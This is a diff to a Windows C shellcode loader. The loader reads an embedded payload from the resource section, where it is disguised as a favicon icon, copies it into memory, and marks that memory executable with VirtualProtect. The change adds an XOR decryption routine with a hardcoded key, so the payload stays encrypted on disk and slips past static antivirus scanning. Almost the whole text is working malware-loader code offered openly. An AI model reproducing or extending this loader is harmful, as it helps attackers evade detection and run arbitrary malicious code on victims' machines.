@@ -11,9 +11,19 @@
 #include <stdlib.h>
 #include <string.h>
 #include "resource.h"
+void XOR(char* data, size_t data_len, char* key, size_t key_len) {
+    int j;
+
+    j = 0;
+    for (int i = 0; i < data_len; i++) {
+        if (j == key_len - 1) j = 0;
+
+        data[i] = data[i] ^ key[j];
+        j++;
+    }
+}
 
 int main(void) {
-    
     void * exec_mem;
     BOOL rv;
     HANDLE th;
@@ -21,9 +31,10 @@ int main(void) {
     HGLOBAL resHandle = NULL;
     HRSRC res;
     
-    unsigned char * payload;
+    unsigned char* payload;
     unsigned int payload_len;
-    
+    char key[] = "mysecretkeee";
+
     // Extract payload from resources section
     res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
     resHandle = LoadResource(NULL, res);
@@ -37,7 +48,10 @@ int main(void) {
 
     // Copy payload to new memory buffer
     RtlMoveMemory(exec_mem, payload, payload_len);
-    
+
+    // Decrypt (DeXOR) the payload
+    XOR((char*)exec_mem, payload_len, key, sizeof(key));
+
     // Make the buffer executable
     rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldProtect);
 
